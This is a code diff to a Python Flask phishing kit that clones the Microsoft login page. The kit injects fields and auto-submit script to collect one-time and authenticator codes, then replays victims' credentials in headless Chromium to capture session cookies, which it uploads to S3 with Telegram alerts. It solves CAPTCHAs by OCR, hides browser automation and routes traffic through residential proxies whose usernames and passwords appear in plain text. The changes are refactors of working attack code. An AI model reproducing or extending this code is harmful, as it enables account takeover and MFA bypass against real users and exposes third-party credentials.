@@ -30,8 +30,8 @@ os.makedirs(BASE_CACHE_PATH, exist_ok=True)
 # === PROXY CONFIG ===
 PROXIES = [
     {
-        "http": "http://brd-customer-hl_f20da391-zone-datacenter_proxy1:cbeo1p2ho8ni@brd.superproxy.io:33335",
-        "https": "http://brd-customer-hl_f20da391-zone-datacenter_proxy1:cbeo1p2ho8ni@brd.superproxy.io:33335"
+        "http": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335",
+        "https": "http://brd-customer-hl_63e21a83-zone-residential_proxy1:p12arcxe874w@brd.superproxy.io:33335"
     },
 ]
 
@@ -79,18 +79,21 @@ def upload_to_s3(file_path, key):
         send_telegram_message(f"❌ S3 upload failed: {e}")
 
 # === SELENIUM SETUP ===
-def setup_chrome(profile_path):
+def setup_chrome_options(profile_dir=None):
     chrome_options = Options()
-    chrome_options.add_argument(f"--user-data-dir={profile_path}")
-    chrome_options.add_argument("--profile-directory=Default")
-    chrome_options.add_argument("--disable-extensions")
-    chrome_options.add_argument("--disable-plugins")
+    chrome_options.add_argument("--headless")
     chrome_options.add_argument("--no-sandbox")
     chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_experimental_option("useAutomationExtension", False)
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--window-size=1920,1080")
+    chrome_options.add_argument("--disable-extensions")
+    chrome_options.add_argument("--disable-infobars")
     chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-    chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--disable-software-rasterizer")
+    chrome_options.add_argument("--remote-debugging-port=9222")
+    if profile_dir:
+        chrome_options.add_argument(f"--user-data-dir={profile_dir}")
+    chrome_options.binary_location = "/usr/bin/chromium-browser"
     return chrome_options
 
 # === CAPTCHA SOLVER (OCR) ===
@@ -137,7 +140,6 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
                 captcha_src = urljoin(url, captcha_src)
             captcha_value = solve_captcha_with_ocr(captcha_src, proxy)
             if captcha_value:
-                # Inject CAPTCHA into form
                 captcha_input = soup.find("input", {"name": "captcha"})
                 if captcha_input:
                     captcha_input["value"] = captcha_value
@@ -152,7 +154,8 @@ def fetch_ms_login(url, cache_key, use_browser_fallback=True, session_id=None):
         if use_browser_fallback:
             try:
                 print("[DEBUG] Trying browser fallback...")
-                chrome_options = setup_chrome(f"/tmp/chrome_profile_{uuid.uuid4().hex[:6]}")
+                profile_dir = f"/tmp/chrome_profile_{uuid.uuid4().hex[:6]}"
+                chrome_options = setup_chrome_options(profile_dir)
                 driver = webdriver.Chrome(options=chrome_options)
                 driver.get(url)
                 time.sleep(random.uniform(2, 4))
@@ -183,7 +186,6 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
             if email_input:
                 email_input['value'] = prefill['loginfmt']
         if add_mfa_inputs:
-            # Add styling for OTP/TOTP fields
             style_tag = soup.new_tag("style")
             style_tag.string = """
                 input[name="otc"], input[name="authenticatorCode"] {
@@ -196,8 +198,6 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
                 }
             """
             soup.head.append(style_tag)
-
-            # Add OTP and TOTP fields
             otp_input = soup.new_tag("input", type="text", name="otc", placeholder="Enter OTP (SMS/Email)")
             totp_input = soup.new_tag("input", type="text", name="authenticatorCode", placeholder="Enter TOTP (Authenticator App)")
             submit_button = form.find("input", {"type": "submit"})
@@ -207,8 +207,6 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
             else:
                 form.append(otp_input)
                 form.append(totp_input)
-
-            # Add auto-submit JS
             script_tag = soup.new_tag("script")
             script_tag.string = """
                 document.addEventListener("DOMContentLoaded", function () {
@@ -223,7 +221,6 @@ def rewrite_form(html, action_url, extra_hidden=None, prefill=None, add_mfa_inpu
                 });
             """
             soup.body.append(script_tag)
-    # Proxy all assets
     for tag in soup.find_all(["img", "link", "script"]):
         attr = "src" if tag.name != "link" else "href"
         if tag.has_attr(attr):
@@ -272,6 +269,11 @@ def asset_proxy():
     except Exception as e:
         print(f"[ERROR] Asset fetch failed: {e}")
         return "Asset fetch failed", 500
+
+# === HEALTH CHECK ROUTE ===
+@app.route('/healthz')
+def healthz():
+    return "OK", 200
 
 # === LOGIN ROUTES ===
 @app.route('/', methods=['GET'])
@@ -348,7 +350,7 @@ def auto_login_dynamic_mfa(email, password, otp, totp, session_id):
     try:
         profile_path = os.path.join(BASE_CACHE_PATH, f"profile_{uuid.uuid4()}")
         os.makedirs(profile_path, exist_ok=True)
-        chrome_options = setup_chrome(profile_path)
+        chrome_options = setup_chrome_options(profile_path)
         driver = webdriver.Chrome(options=chrome_options)
         driver.get("https://login.microsoftonline.com")
 
@@ -410,7 +412,7 @@ def wait_for_login(driver, session_id, timeout=120):
     return False
 
 def capture_cookies(driver, session_id):
-    session_dir = os.path.join(BASE_CACHE_PATH, session_id)
+    session_dir= os.path.join(BASE_CACHE_PATH, session_id)
     os.makedirs(session_dir, exist_ok=True)
     all_cookies = driver.get_cookies()
     relevant_cookies = [c for c in all_cookies if any(t in c.get('domain', '') for t in [
